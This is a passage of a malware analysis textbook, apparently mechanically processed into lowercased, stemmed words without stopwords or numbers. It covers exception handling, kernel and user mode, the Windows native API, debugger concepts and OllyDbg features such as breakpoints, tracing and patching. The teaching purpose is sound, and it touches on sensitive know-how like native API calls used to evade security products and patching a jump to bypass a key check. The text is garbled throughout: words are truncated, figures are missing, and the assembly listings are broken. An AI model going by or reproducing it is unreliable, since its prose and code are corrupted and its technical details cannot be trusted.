server function malwar browser helper object bho thirdparti plugin internet explor bho restrict malwar author use run code run insid internet explor process allow monitor internet traffic track browser usag commun internet without run process malwar implement com server usual easi detect export sever function includ dllcanunloadnow dllgetclassobject dllinstal dllregisterserv dllunregisterserv must export com server except thing go wrong except allow program handl event outsid flow normal execut time except caus error divis zero except occur execut transfer special routin resolv except except divis zero rais hardwar other invalid memori access rais os also raisean except explicitli code raiseexcept call structur except handl seh window mechan handl except bit system seh inform store stack exampl show disassembl first line function except handl exampl store exceptionhandl inform fs push offset locc mov eax larg fs b push eax c mov larg fs esp begin function exceptionhandl frame put onto stack special locat fs point address stack store except inform stack locat except handler well except handler use caller restor end function except occur window look fs stack locat store except inform except handler call except handl execut return main thread except handler nest handler respond except except handler current frame handl except pass except handler caller frame eventu none except handler respond except toplevel except handler crash applic except handler use exploit code gain execut pointer exceptionhandl inform store stack stack overflow attack overwrit pointer specifi new except handler attack gain execut except occur except cover depth debug antidebug chapter chapter chapter chapter chapter kernel vs user mode window use two processor privileg level kernel mode user mode function discuss chapter usermod function kernelmod equival way thing nearli code run user mode except os hardwar driver run kernel mode user mode process memori secur permiss resourc usermod program execut invalid instruct crash window reclaim resourc termin program normal user mode access hardwar directli restrict subset regist instruct avail cpu order manipul hardwar chang state kernel user mode must reli window api call window api function manipul kernel structur make call kernel presenc sysent syscal int xe instruct disassembl indic call made kernel sinc possibl jump directli user mode kernel instruct use lookup tabl locat predefin function execut kernel process run kernel share resourc memori address kernel mode code fewer secur check code run kernel execut contain invalid instruct os continu run result famou window blue screen code run kernel manipul code run user space code run user space affect kernel welldefin interfac even though code run kernel share memori resourc alway singl process context activ kernel code import malwar writer done kernel mode user mode secur program antiviru softwar firewal run kernel mode access monitor activ applic run system malwar run kernel mode easili interfer secur program bypass firewal clearli malwar run kernel consider power malwarerun user space within kernel space distinct process run privileg unprivileg user remov addit oss audit featur dont appli kernel reason nearli rootkit util code run kernel develop kernelmod code consider difficult develop user code one major hurdl kernel code much like crash system develop debug mani common function avail kernel fewer tool compil develop kernelmod code due challeng sophist malwar run kernel malwar kernel compon analyz kernel malwar see chapter nativ api nativ api lowerlevel interfac interact window rare use nonmalici program popular among malwar writer call function nativ api bypass normal window api call function window api function usual perform request action directli import data structur store kernel access code outsid kernel usermod code microsoft creat multistep process user applic achiev necessari function figur illustr work api call figur user mode kernel mode user applic given access user api kerneldl dll call ntdlldll special dll manag interact user space kernel processor switch kernel mode execut function kernel normal locat ntoskrnlex process convolut separ kernel user api allow microsoft chang kernel without affect exist applicationsth ntdll function use api structur like one use kernel function make nativ api program suppos call nativ api noth os prevent although microsoft provid thorough document nativ api websit book document function best refer window nt nativ api refer gari nebbett sam although quit old onlin resourc httpundocumentedntinternalsnet provid recent inform call nativ api directli attract malwar writer allow thing might otherwis possibl lot function expos regular window api accomplish call nativ api directli addit call nativ api directli sometim stealthier mani antiviru hostprotect product monitor system call made process process call nativ api function directli may abl evad poorli design secur product figur show diagram system call poorli design secur program monitor call kerneldl order bypass secur program hypothet malwar use nativ api instead call window function readfil writefil malwar call function ntreadfil ntwritefil function ntdlldll monitor secur program welldesign secur program monitor call level includ kernel ensur tactic doesnt workfigur use nativ api avoid detect seri nativ api call use get inform system process thread handl item includ ntquerysysteminform ntqueryinformationprocess ntqueryinformationthread ntqueryinformationfil ntqueryinformationkey call provid much detail inform avail win call function allow set fine grain attribut file process thread anoth nativ api function popular malwar author ntcontinu function use return except meant transfer execut back main thread program except handl howev locat return specifi except context chang malwar often use function transfer execut complic way order confus analyst make program difficult debug note cover sever function start prefix nt instanc export tabl ofntdlldll function either nt prefix zw prefix exampl ntreadfil function zwreadfil function user space function behav exactli way usual call exact code sometim minor differ call kernel mode differ safe ignor malwar analyst nativ applic applic use win subsystem issu call nativ api applic rare malwar almost nonexist nonmalici softwar nativ applic like malici subsystem pe header indic program nativ applicationconclus chapter cover window concept import malwar analysi concept process thread network function come your analyz malwar mani specif malwar exampl discuss chapter common familiar allow recogn quickli malwar order better understand program overal purpos concept import static malwar analysi come lab throughout book well realworld malwarelab lab analyz malwar found file labex question q program ensur continu run achiev persist comput restart q program use mutex q good hostbas signatur use detect program q good networkbas signatur detect malwar q purpos program q program finish execut lab analyz malwar found file labex question q program achiev persist q purpos program q program finish execut lab lab obtain malici execut labex dll labdll prior execut import note malwar might chang run file found directori victim machin run program ensur file directori analysi machin visibl ip string begin loopback address connect local machin real version malwar address connect remot machin weve set connect tolocalhost protect warn lab may caus consider damag comput may difficult remov instal run file without virtual machin snapshot taken prior execut lab may bit challeng previou one youll need use combin static dynam method focu big pictur order avoid get bog detail question q program achiev persist ensur continu run comput restart q two good hostbas signatur malwar q purpos program q could remov malwar installedpart iii advanc dynam analysischapt debug debugg piec softwar hardwar use test examin execut anoth program debugg help process develop softwar sinc program usual error first written develop provid input program see output dont see program produc output debugg give insight program execut debugg design allow develop measur control intern state execut program debugg provid inform program would difficult imposs get disassembl disassembl offer snapshot program look like immedi prior execut first instruct debugg provid dynam view program run exampl debugg show valu memori address chang throughout execut program abil measur control program execut provid critic insight malwar analysi debugg allow see valu everi memori locat regist argument everi function debugg also let chang anyth program execut time exampl chang valu singl variabl point timeal need enough inform variabl includ locat next two chapter cover two debugg ollydbg windbg chapter focu concept featur common debugg sourcelevel vs assemblylevel debugg softwar develop familiar sourcelevel debugg allow programm debug code type debugg usual built integr develop environ ide sourcelevel debugg allow set breakpoint stop line sourc code order examin intern variabl state step program execut one line time well discuss breakpoint depth later chapterassemblylevel debugg sometim call lowlevel debugg oper assembl code instead sourc code sourcelevel debugg use assemblylevel debugg step program one instruct time set breakpoint stop specif line assembl code examin memori locat malwar analyst make heavi use assemblylevel debugg requir access program sourc codekernel vs usermod debug chapter discuss differ window user mode kernel mode challeng debug kernelmod code debug usermod code usual need two differ system kernel mode user mode debugg run system code debug debug user mode debug singl execut separ execut os kernel debug perform two system one kernel kernel breakpoint applic run system one system run code debug anoth run debugg addit os must configur allow kernel debug must connect two machin note possibl run kernel debugg system code debug uncommon program call softic use provid function support sinc earli vendor current offer product function differ softwar packag usermod debug kernel debug windbg current popular tool support kernel debug ollydbg popular debugg malwar analyst support kernel debug windbg support usermod debug well ida pro builtin debugg offer featur eas use ollydbgus debugg two way debug program first start program debugg start program load memori stop run immedi prior execut entri point point complet control program also attach debugg program alreadi run program thread paus debug good approach want debug program run want debug process affect malwar singlestep simplest thing debugg singlestep program mean run singl instruct return control debugg singlestep allow see everyth go within program possibl singlestep entir program complex program take long time singlestep good tool understand detail section code must select code analyz focu big pictur youll get lost detail exampl disassembl exampl show might use debugg help understand section code exampl step code mov edi dword mov ecx xd locb xor edi xc inc edi loopw locb dword ffdfd list show data address access modifi loop data valu shown end doesnt appear ascii text recogniz valu use debugg step loop reveal code doingif singlestep loop either windbg ollydbg would see data modifi exampl exampl see byte modifi function chang time loop list show byte address along ascii represent exampl singlestep section code see chang memori dffdf dffeee fdeeedd c cffdf dffeee fdeeedd c l cffdf dffeee fdeeedd c lo cff dffeee fdeeedd c loa snip cf c loadlibrarya debugg attach clear function use singlebyt xor function decod string loadlibrarya would difficult identifi string static analysi steppingov vs steppinginto singlestep code debugg stop everi instruct howev gener concern program may concern function call exampl program call loadlibrari probabl dont want step everi instruct loadlibrari function control instruct see debugg stepov stepinto instruct stepov call instruct bypass exampl stepov call next instruct see debugg instruct function call return hand stepinto call instruct next instruct see debugg first instruct call function steppingov allow significantli decreas amount instruct need analyz risk miss import function stepov wrong function addit certain function call never return program call function never return stepov debugg never regain control happen probabl restart program step locat time stepinto functionnot good time use vmware recordreplay featur stepov function never return replay debug session correct mistak start record begin debug stepov function never return stop record replay steppedov function stop replay take control machin time stepinto function steppinginto function easi quickli begin singlestep instruct noth analyz analyz function stepinto function call call anoth function anoth long analyz code littl relev seek fortun debugg allow return call function debugg stepout function run function return debugg similar featur execut return instruct immedi prior end function paus execut breakpoint breakpoint use paus execut allow examin program state program paus breakpoint refer broken breakpoint need cant access regist memori address program run sinc valu constantli chang exampl demonstr breakpoint would use exampl call eax disassembl couldnt tell function call could set breakpoint instruct find program hit breakpoint stop debugg show valu eax destin function call exampl call eax mov ecx ebparg b mov eax edx call eax anoth exampl exampl show begin function call createfil open handl file assembl difficult determin name file although part name pass paramet function find file disassembl could use ida pro search allth time function call order see argument pass valu could turn pass paramet deriv function call could quickli becom difficult determin filenam use debugg make task easi exampl use debugg determin filenam b xor eax esp mov espdhvar eax mov eax edx mov espdhnumberofbyteswritten add eax fffffffeh mov cx eax add eax test cx cx jnz short loc c mov ecx dword ptr dsatxt txt push htemplatefil push dwflagsandattribut push dwcreationdisposit mov eax ecx mov ecx dword ptr dsatxt push lpsecurityattribut push dwsharemod mov eax ecx mov cx word ptr dsatxt e push dwdesiredaccess push edx lpfilenam mov eax cx call createfilew createfilewxxxxxxx set breakpoint call createfilew look valu stack breakpoint trigger figur show screenshot instruct breakpoint within windbg debugg breakpoint display first paramet function ascii string use windbg youll learn chapter cover windbgfigur use breakpoint see paramet function call set breakpoint createfilew examin first paramet stack case clear file creat call logfiletxt could figur ida pro faster easier get inform debugg imagin piec malwar packet captur packet captur see encrypt data find call send discov encrypt code difficult decrypt data dont know encrypt routin key luckili use debugg simplifi task encrypt routin often separ function transform data find encrypt routin call set breakpoint data encrypt view data sent shown disassembl function exampl exampl use breakpoint view data program encrypt sub esp cch mov eax dword db xor eax esp dd mov espcchvar eax e lea eax espcchbuf e call getdata ec lea eax espcchbuf ef call encryptdataf mov ecx fa push flag fc push ch len lea eax espdhbuf push eax buf push ecx call dssend figur show debug window ollydbg display buffer memori prior sent encrypt routin top window show instruct breakpoint bottom window display messag case data sent secret messag shown ascii column bottom right figur view program data prior encrypt function call use sever differ type breakpoint includ softwar execut hardwar execut condit breakpoint although breakpoint serv gener purpos depend situat certain breakpoint work other let look one work softwar execut breakpoint far talk softwar execut breakpoint caus program stop particular instruct execut set breakpoint without option popular debugg set softwar execut breakpoint default debugg implement softwar breakpoint overwrit first byte instruct xcc instruct int breakpoint interrupt designedfor use debugg xcc instruct execut os gener except transfer control debugg tabl show memori dump disassembl function breakpoint set side side tabl disassembl memori dump function breakpoint set disassembl view memori dump push ebp b ec mov ebp esp e f esp fffffffh ec sub esp ah c mov eax dword cc b ec e f ec c function start push ebp correspond opcod x function memori dump start byte xcc repres breakpoint disassembl window debugg show origin instruct memori dump produc program debugg show actual byte store locat debugg memori dump show origin x byte program read code extern program read byte xcc valu shown byte chang execut program breakpoint occur exampl set breakpoint section code code selfmodifi modifi anoth section code breakpoint eras code read memori function breakpoint read xcc byte instead origin byte also code verifi integr function notic discrep set unlimit number softwar breakpoint user mode although may limit kernel mode code chang small requir small amount memori recordkeep debuggerhardwar execut breakpoint x architectur support hardwar execut breakpoint dedic hardwar regist everi time processor execut instruct hardwar detect instruct pointer equal breakpoint address unlik softwar breakpoint hardwar breakpoint doesnt matter byte store locat exampl set breakpoint address x processor break locat regardless store signific benefit debug code modifi hardwar breakpoint anoth advantag softwar breakpoint set break access rather execut exampl set hardwar breakpoint break whenev certain memori locat read written your tri determin valu store memori locat signifi could set hardwar breakpoint memori locat write locat debugg break regardless address instruct execut set access breakpoint trigger read write unfortun hardwar execut breakpoint one major drawback four hardwar regist store breakpoint address one drawback hardwar breakpoint easi modifi run program eight debug regist chipset six use first four dr dr store address breakpoint debug control regist dr store inform whether valu dr dr enabl whether repres read write execut breakpoint malici program modifi regist often interfer debugg thank x chip featur protect set gener detect flag dr regist trigger breakpoint occur prior execut mov instruct access debug regist allow detect debug regist chang although method perfect detect mov instruct access debug regist valuabl nonetheless condit breakpoint condit breakpoint softwar breakpoint break certaincondit true exampl suppos breakpoint function getprocaddress break everi time getprocaddress call suppos want break paramet pass getprocaddress regsetvalu done condit breakpoint case condit would valu stack correspond first paramet condit breakpoint implement softwar breakpoint debugg alway receiv debugg evalu condit condit met automat continu execut without alert user differ debugg support differ condit breakpoint take much longer run ordinari instruct program slow consider set condit breakpoint instruct access often fact program may slow much never finish concern uncondit breakpoint extent program slow irrelev compar amount time take examin program state despit drawback condit breakpoint prove realli use dissect narrow segment codeexcept except princip way debugg gain control run program hood even breakpoint gener except nondebug relat event invalid memori access divis zero well except specif malwar malwar analysi debug often caus bug debugg usual handl except also use govern flow execut normal program without involv debugg function place ensur debugg program debug use except firstand secondch except debugg usual given two opportun handl except firstchanc except secondch except except occur debugg attach program debug stop execut debugg given first chanc control debugg handl except pass program debug program need decid handl except even unrel code your interest program regist except handler given chanc handl except debugg first chanc exampl calcul program could regist except handler dividebyzero except program execut dividebyzero oper except handler inform user error continu execut happen program run without debugg attach applic handl except debugg given anoth chanc handl itth secondch except debugg receiv secondch except mean program would crash debugg attach debugg must resolv except allow program run analyz malwar gener look bug firstchanceexcept often ignor malwar may intent gener firstchanc except order make program difficult debug youll learn chapter chapter secondch except ignor program continu run encount secondch except debug malwar may bug malwar caus crash like malwar doesnt like environ run common except sever common except common except one occur int instruct execut debugg special code handl int except oss treat except program may includ instruct handl int except debugg attach get first chanc debugg pass except program program except handler handl singlestep also implement except within os flag flag regist call trap flag use singlestep trap flag set processor execut one instruct gener except memoryaccess violat except gener code tri access locat access except usual occur memori address invalid may occur memori access due accesscontrol protect certain instruct execut processor privileg mode program attempt execut outsid privileg mode processor gener except note privileg mode kernel mode nonprivileg mode user mode term privileg nonprivileg commonli use talk processor exampl privileg instruct one write hardwar modifi memori page tablesmodifi execut debugg debugg use chang program execut chang control flag instruct pointer code modifi way program execut exampl avoid function call could set breakpoint function call breakpoint hit could set instruct pointer instruct call thu prevent call take place function particularli import program might run properli skip might crash function impact area program program might continu run without problem also use debugg chang instruct pointer exampl say function manipul string call encodestr cant determin encodestr call use debugg run function without know function call debug encodestr see happen input string hello world instanc set valu esp pointer string hello world could set instruct pointer first instruct encodestr singlestep function see cours destroy program stack program wont run properli function complet techniqu prove extrem use want see certain section code behavesmodifi program execut practic last exampl chapter come real viru perform differ depend languag set comput infect languag set simplifi chines viru uninstal machin caus damag languag set english display popup poorli translat messag say luck good languag set japanes indonesian viru overwrot hard drive garbag data effort destroy comput let see could analyz program would japanes system without actual chang languag set list show assembl code differenti languag set program first call function getsystemdefaultlcid next base return valu program call one three differ function local id english japanes indonesian chines x x x xc respect exampl assembl differenti languag set call getsystemdefaultlcid f mov ebpvar eax cmp ebpvar h jnz short loc b call sub cmp ebpvar h jz short loc cmp ebpvar h jnz short loc call subf cmp ebpvar ch e jnz short loc call suba code call function x languag english xf languag japanes indonesian x languag chines order analyz properli need execut code run system local set japanes indonesian use debugg forc code run code path without chang set system set breakpoint chang return valu specif run us english system eax would store valu x could chang eax debugg x continu run program would execut code run japanes languag system coursey would want dispos virtual machineconclus debug critic tool obtain inform malici program would difficult obtain disassembl alon use debugg singlestep program see exactli what happen intern set breakpoint get inform particular section code also use debugg modifi execut program order gain addit inform take practic abl analyz malwar effect debugg next two chapter cover specif use ollydbg windbg debuggerschapt ollydbg chapter focus ollydbg x debugg develop oleh yuschuk ollydbg provid abil analyz malwar run ollydbg commonli use malwar analyst revers engin free easi use mani plugin extend capabl ollydbg around decad interest histori first use crack softwar even becam popular malwar analysi primari debugg choic malwar analyst exploit develop ollydbg code base purchas immun secur compani rebrand immun debugg immdbg immun goal gear tool toward exploit develop patch bug ollydbg immdbg end cosmet modifi ollydbg gui ad fulli function python interpret api led user begin use immdbg instead ollydbg said prefer immdbg dont worri basic ollydbg everyth youll learn chapter appli item note mani plugin ollydbg wont automat run immdbg therefor port immdbg may lose access ollydbg plugin immdbg benefit make easier extend function use python api discuss scriptabl debug ad ollydbg complic histori version releas june version written ground mani consid beta version widespread use write throughout chapter remaind book point time version use applic featur exist version load malwar sever way begin debug malwar ollydbg load execut even dll directli malwar alreadi run system attach process debug way ollydbg provid flexiblesystem run malwar commandlin option execut specif function within dll open execut easiest way debug malwar select file open brows execut wish load shown figur program debug requir argument specifi argument field open dialog load time pass commandlin argument ollydbg figur open execut commandlin option youv open execut ollydbg load binari use loader work similarli way window os load file default ollydbg paus softwar develop entri point known winmain locat determin otherwis break entri point defin pe header chang startup option select ollydbg debug option menu option debug option exampl break immedi code execut select system breakpoint startup option note ollydbg break capabl version exampl set paus startof tl callback tl callback allow malwar execut ollydbg paus execut chapter discuss tl callback use antidebug protect attach run process addit open execut directli attach ollydbg run process youll find featur use want debug run malwar attach ollydbg process select file attach bring menu select process want attach youll need know process id one process name next select process choos attach menu ollydbg break paus program thread attach ollydbg current execut thread code paus display screen howev might paus execut instruct within system dll dont want debug window librari happen easiest way get main code set breakpoint access entir code section caus program break execut next time code section access explain set breakpoint like later chapterth ollydbg interfac soon load program ollydbg see four window fill inform find use malwar analysi shown figur figur ollydbg interfac window display inform follow disassembl window window show debug program code current instruct pointer sever instruct typic next instruct execut highlight window modifi instruct data add new assembl instruct press spacebar within window regist window window show current state regist debug program code debug regist chang color black red previous execut instruct modifi regist disassembl window modifi data regist window program debug rightclick regist valu andselect modifi present modifi dialog shown figur chang valu figur modifi regist stack window window show current state stack memori thread debug window alway show top stack given thread manipul stack window right click stack locat select modifi ollydbg place use comment stack locat describ argument place stack api call aid analysi sinc wont need figur stack order look api argument order memori dump window window show dump live memori debug process press ctrl g window enter memori locat dump memori address click memori address select follow dump dump memori address edit memori window rightclick choos binari edit use modifi global variabl data malwar store rammemori map memori map window view memori display memori block alloc debug program figur show memori map netcat program figur memori map netcat ncex memori map great way see program laid memori see figur execut label along code data section dll code data section also viewabl doubleclick row memori map show memori dump section send data memori dump disassembl window right click select view disassemblerrebas memori map help understand pe file rebas runtim rebas happen modul window load prefer base address base address pe file window prefer base address known imag base defin pe header imag base isnt necessarili address malwar load although usual execut design load x default address use mani compil window platform develop choos base execut differ address execut support address space layout random aslr secur enhanc often reloc said reloc dll much common reloc necessari singl applic may import mani dll prefer base address memori would like load two dll load prefer load address x cant load instead window load one dll address reloc dll somewher els dll ship window os differ prefer base address wont collid howev thirdparti applic often prefer base address absolut vs rel address reloc process involv simpli load code anoth locat mani instruct refer rel address memori other refer absolut one exampl exampl show typic seri instruct exampl assembl code requir reloc mov eax ebpvar cmp ebpvar jnz loc c mov eax dwordcf instruct work fine matter load inmemori sinc use rel address howev dataaccess instruct work use absolut address access memori locat file load memori locat prefer base locat address wrong instruct must chang file load differ address dll come packag list fixup locat reloc section pe header dll load exe order mean gener predict dll locat memori rebas dll reloc section remov dll lack reloc section load prefer base address load reloc dll bad perform add load time compil select default base address dll compil gener default base address dll fact greatli increas likelihood reloc occur dll design load address good programm awar select base address dll order minim reloc figur illustr dll reloc use memori map function ollydbg exe see one execut two dll dll prefer load address x alreadi memori exe prefer load address x dllb load also prefer load address x reloc x dllb absolut address memori refer chang work properli new address figur dllb reloc differ memori address request locat your look dllb ida pro also debug applic theaddress ida pro knowledg rebas occur runtim may need frequent adjust everi time want examin address memori got ida pro avoid issu use manual load process discuss chapter view thread stack malwar often use multipl thread view current thread within program select view thread bring thread window window show memori locat thread current statu activ paus suspend sinc ollydbg singlethread might need paus thread set breakpoint continu run program order begin debug within particular thread click paus button main toolbar paus activ thread figur show exampl thread window five thread paus also kill individu thread rightclick individu thread display option shown figur select kill thread figur thread window show five paus thread context menu individu thread thread given process stack import data often store stack use memori map view stack memori exampl figur see ollydbg label main thread stack stack main threadexecut code thorough knowledg abil execut code within debugg import debug success mani differ way execut code ollydbg tabl list popular method tabl ollydbg codeexecut option function menu hotkey button runplay debug run f paus debug paus f run select breakpoint run select f run return debug execut till return ctrl f run user code debug execut till user code alt f singlestepstepinto debug step f stepov debug step f simplest option run paus caus program start stop run howev paus seldom use caus program paus locat use librari code rather use paus typic want select set breakpoint discuss next section run option use frequent restart stop process often hit breakpoint order continu execut run select option execut code select instruct execut select instruct never execut program run indefinit execut till return option paus execut current function set return use want program paus immedi current function finish execut howev function never end program continu run indefinit execut till user code option use malwar analysi getlost librari code debug paus within librari code select debug execut till user code caus program run execut return compil malwar code typic text section debug ollydbg provid sever way step code discuss chapter step refer concept execut singl instruct immedi paus execut afterward allow keep track program instruct instruct ollydbg offer two type step describ previou chapter singl step also known steppinginto steppingov singlestep press f key stepov press f note singlestep easiest form step mean ollydbg execut singl instruct paus matter type instruct execut exampl singlestep instruct call ollydbg paus address call instruct transfer eip address conceptu steppingov almost simpl singlestep consid follow list instruct call xor ebx ebx stepov call instruct ollydbg immedi paus execut xor ebx ebx instruct call use may want dive subroutin locat although steppingov conceptu simpl hood much complic ollydbg place breakpoint resum execut hit run button subroutin eventu execut ret instruct paus due hidden breakpoint warn almost case steppingov work expect rare case possibl obfusc malici code take advantag process exampl subroutin might never execut ret could socal geteip oper pop return address stack rare case steppingov could caus program resum execut without ever paus awar use cautiouslybreakpoint discuss chapter sever differ type breakpoint ollydbg support type default use softwar breakpoint also use hardwar breakpoint addit set condit breakpoint well set breakpoint memori add remov breakpoint select instruct disassembl window press f view activ breakpoint program select view breakpoint click b icon toolbar close termin debug program ollydbg typic save breakpoint locat set enabl debug program breakpoint dont need set breakpoint tabl show complet list ollydbg breakpoint tabl ollydbg breakpoint option function rightclick menu select hotkey softwar breakpoint breakpoint toggl f condit breakpoint breakpoint condit shiftf hardwar breakpoint breakpoint hardwar execut memori breakpoint access read write execut breakpoint memori access f select memori memori breakpoint write breakpoint memori write softwar breakpoint softwar breakpoint particularli use debug string decod function recal chapter string use way gain insight program function malwar author often tri obfusc string malwar author often use string decod call string use exampl show exampl call stringdecod obfusc data push stackexampl string decod breakpoint push offset nnptnhlkixopmibhuajvrknauvblr call stringdecod push offset ugkldnlltemldcezimujieubqdfz call stringdecod obfusc data often decod use string stack way see view stack string decod complet therefor best place set breakpoint view string end string decod routin way time choos play ollydbg program continu execut break string decod use method identifi string program use use later chapter discuss modifi instruct decod string condit breakpoint learn previou chapter condit breakpoint softwar breakpoint break certain condit true ollydbg allow set condit breakpoint use express time softwar breakpoint hit express evalu express result nonzero execut paus warn care use condit breakpoint set one may caus program run much slowli incorrect condit program may never stop run condit softwar breakpoint particularli use want save time tri paus execut certain paramet pass frequent call api function demonstr follow exampl use condit breakpoint detect memori alloc certain size consid poison ivi popular backdoor receiv command internet commandandcontrol server oper attack command implement shellcod poison ivi alloc memori hous shellcod receiv howev memori alloc perform poison ivi small uninterest except commandandcontrol server send larg quantiti shellcod execut best way catch poison ivi alloc shellcod set condit breakpoint virtualalloc function kerneldl api function poison ivi use dynam alloc memori therefor set condit breakpoint alloc size greater byte program paus smaller frequent memori alloc occur set trap begin put standard breakpoint start virtualalloc function run breakpoint hit figur show stack window breakpoint hit start virtualalloc figur stack window start virtualalloc figur show top five item stack return address first follow four paramet address size allocationtyp protect virtualalloc paramet label next valu locat stack exampl x byte alloc sinc top stack point esp regist order access size field must refer memori esp figur show disassembl window breakpoint hit start virtualalloc set condit breakpoint esp order catch poison ivi receiv larg amount shellcod set condit softwar breakpoint follow step rightclick disassembl window first instruct function select breakpoint condit bring dialog ask condit express set express click ok exampl use esp click play wait code breakfigur set condit breakpoint disassembl window hardwar breakpoint ollydbg provid function set hardwar breakpoint use dedic hardwar regist describ chapter hardwar breakpoint power dont alter code stack target resourc also dont slow execut speed note previou chapter problem hardwar breakpoint set four time set hardwar breakpoint instruct rightclick instruct select breakpoint hardwar execut tell ollydbg use hardwar breakpoint instead softwar breakpoint default use debug option menu might order protect certain antidebug techniqu softwar breakpoint scan well discuss chapter memori breakpoint ollydbg support memori breakpoint allow set breakpoint chunk memori order code break access memori ollydbg support use softwar hardwar memori breakpoint well abil specifi whether want break read write execut access set basic memori breakpoint select portion memori memori dump window section memori map rightclick selectbreakpoint memori access set one memori breakpoint time previous set memori breakpoint remov set new one ollydbg implement softwar memori breakpoint chang attribut memori block contain select howev techniqu alway reliabl bring consider overhead therefor use memori breakpoint sparingli memori breakpoint particularli use malwar analysi want find load dll use use memori breakpoint paus execut soon code dll execut follow step bring memori map window rightclick dll text section section contain program execut code select set memori breakpoint access press f click play button resum execut program break execut end dll text sectionload dll addit abl load attach execut ollydbg also debug dll howev sinc dll execut directli ollydbg use dummi program call loaddllex load techniqu extrem use malwar often come packag dll code contain insid dllmain function initi function call dll load process default ollydbg break dll entri point dllmain dll load order call export function argument insid debug dll first need load dll ollydbg paus dll entri point click play button run dllmain initi dll requir shown figur next ollydbg paus call specif export argument debug select debug call dll export main menu figur ollydbg play button exampl figur load wsdll ollydbg call ntohl function convert bit number network host byte order left add argument need add one argument xf network byte order box left check suppli argumentsfigur call dll export quickli view assembl instruct ntohl click follow disassembl button hide call checkbox bottom right use hide window perform call paus call checkbox use paus execut immedi export call use altern use breakpoint set argument regist click call button bottom right forc call take place ollydbg window show valu regist call debug export function sure set breakpoint click call check paus call checkbox figur see result function store eax xf host byte order shown trace trace power debug techniqu record detail execut inform examin ollydbg support varieti trace featur includ standard back trace call stack trace run trace standard back trace time move disassembl window step step option ollydbg record movement use minu key keyboard move back time see instruct previous execut plu key take forward use step trace step taken use step step area step cant go back decid step anoth area call stack use ollydbg view execut path given function via call stack trace view call stack select view call stack main menu see window display sequenc call taken reach current locat walk call stack click address call section call stack window regist stack show go locat unless perform run trace run trace run trace allow execut code ollydbg save everi execut instruct chang made regist flag sever way activ run trace highlight code wish trace disassembl window rightclick select run trace add select execut code select view run trace see instruct execut use key keyboard navig code discuss standard backtrac method youll see chang occur everi regist instruct navig use trace trace option option may easier use add select dont need select code wish trace trace step record instruct execut breakpoint hit trace record instruct occur current function execut warn use trace trace option without set breakpoint ollydbg attempt trace entir program could take long time consum lot memori select debug set condit trace condit hit caus program paus use want stop trace condit occur back trace locat see occur youll see exampl usag next section trace poison ivi recal earlier discuss poison ivi backdoor often alloc memori shellcod receiv commandandcontrol server poison ivi download shellcod copi dynam alloc locat execut case use trace catch shellcod execut eip heap trace show shellcod start figur show condit set catch poison ivi heap execut set ollydbg paus eip less typic imag locat x stack heap dynam alloc memori typic locat simpl program eip locat normal program next select trace entir program trace shellcod execut case program paus eip xa start shellcod use key navig backward see shellcod executedfigur condit tracingexcept handl default except occur ollydbg attach program stop execut debugg given control first debugg handl except pass program ollydbg paus execut except happen decid pass except program one follow shift f step except shift f step shift f run except handler ollydbg option handl except shown figur option tell debugg ignor certain except pass directli program often good idea ignor except malwar analysi debug program order fix problem figur except handl option ollydbgpatch ollydbg make easi modifi live data regist flag also enabl assembl patch code directli program modifi instruct memori highlight region rightclick region select binari edit pop window add opcod data ollydbg also special function fill entri nop instruct figur show section code passwordprotect piec malwar requir special key input order configur malwar see import check condit jump jnz decid key accept jump taken bad key print otherwis print key accept simpl way forc program go keyaccept rout appli patch shown figur highlight condit jump instruct rightclick select binari fill nop chang jnz instruct nop program think key accept figur patch option ollydbg note patch live memori instanc process take patch step copi chang execut twostep process outlin figur figur twostep process copi live memori patch execut disk appli chang rightclick disassembl window patch code select copi execut modif shown copi chang made live memori pop new window shown bottom figur select save file shown save disk notic figur contain code figur except jnz instruct replac two nop instruct procedur would perman store nop locat execut disk mean key accept malwar perman techniqu use wish perman modifi piec malwar order make easier analyzeanalyz shellcod ollydbg easi undocu way analyz shellcod follow step use approach copi shellcod hex editor clipboard within memori map select memori region whose type priv privat memori assign process oppos readonli execut imag share among multipl process doubleclick row memori map bring hex dump examin content region contain hundr byte contigu zero byte rightclick chosen region memori map window select set access full access give region read write execut permiss return memori dump window highlight region zerofil byte larg enough entir shellcod fit rightclick select select binari binari past past shellcod select region set eip regist locat memori modifi easili set eip regist rightclick instruct disassembl window select new origin run debug singlestep shellcod would normal programassist featur ollydbg provid mani mechan help analysi includ follow log ollydbg keep log event constantli avail access select view log log show execut modul load breakpoint hit inform log use analysi figur step took get certain state watch window ollydbg support use watch window allow watch valu express gener express constantli updat window access select view watch set express watch window press spacebar help ollydbg help content option provid detail set instruct write express evalu express use need monitor specif piec data complic function exampl want monitor memori locat eaxesp would enter express eaxesp label ida pro label subroutin loop ollydbg label ollydbg simpli symbol name assign address debug program set label disassembl window rightclick address select label pop window prompt label name refer locat use label instead address figur show exampl ad label passwordloop notic name refer x chang reflect new name figur set label ollydbgplugin ollydbg standard plugin mani addit one avail download youll find decent collect ollydbg plugin use malwar analysi httpwwwopenrceorgdownloadsbrowseollydbgplugin ollydbg plugin come dll place root ollydbg instal directori directori plugin recogn automat ad plugin menu note write plugin ollydbg tediou process wish extend function ollydbg recommend write python script describ later chapter scriptabl debug ollydump ollydump commonli use ollydbg plugin provid abil dump debug process pe file ollydump tri revers process loader perform load execut howev use current state variou section code data exist memori plugin typic use unpack well discuss extens chapter figur show ollydump window dump manual set entri point offset section although recommend let ollydbg automaticallyfigur ollydump plugin window hide debugg hide debugg plugin employ number method hide ollydbg debugg detect mani malwar analyst run plugin time case malwar employ antidebug plugin specif protect isdebuggerpres check findwindow check unhandl except trick ouputdebugstr exploit ollydbg discuss antidebug techniqu chapter command line command line plugin allow commandlin access ollydbg command line creat windbglik experi although mani user ollydbg take advantag windbg debugg discuss next chapter activ commandlin window select plugin command line command line tabl show list common command addit command found help file come command line plugin tabl command ollydbg command line command function bp express condit set softwar breakpoint bc express remov breakpoint hw express set hardwar breakpoint execut bpx label set breakpoint call label stop paus paus execut run run program g express run address step step express dump memori debug often want break execut start import function order see paramet pass function use command line quickli set breakpoint start import function exampl figur piec malwar string obfusc howev import gethostbynam shown figur execut command bp gethostbynam command line set breakpoint start gethostbynam function set breakpoint run program break start gethostbynam look paramet see hostnam intend resolv malwar eanalysisbookcom examplefigur use command line quickli set breakpoint bookmark bookmark plugin includ default ollydbg enabl add bookmark memori locat get easili futur without need rememb address add bookmark rightclick disassembl window select bookmark insert bookmark view bookmark select plugin bookmark bookmark click bookmark go locationscript debug sinc ollydbg plugin compil dll creat modifi plugin tend involv process therefor extend function employ immdbg employ python script easytous api immdbg python api includ 